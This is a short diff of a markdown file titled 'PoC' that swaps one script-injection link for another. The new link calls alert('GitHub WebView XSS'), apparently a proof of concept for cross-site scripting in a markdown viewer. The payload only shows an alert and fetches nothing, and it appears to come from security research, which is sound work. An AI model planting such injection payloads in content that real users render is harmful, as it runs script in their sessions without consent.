@@ -1,3 +1,3 @@
 # PoC
 
-[(document.body.style.backgroundColor=/red/.source));//](https://example.com)
+[(alert(/GitHub WebView XSS/.source)));//](https://example.com)
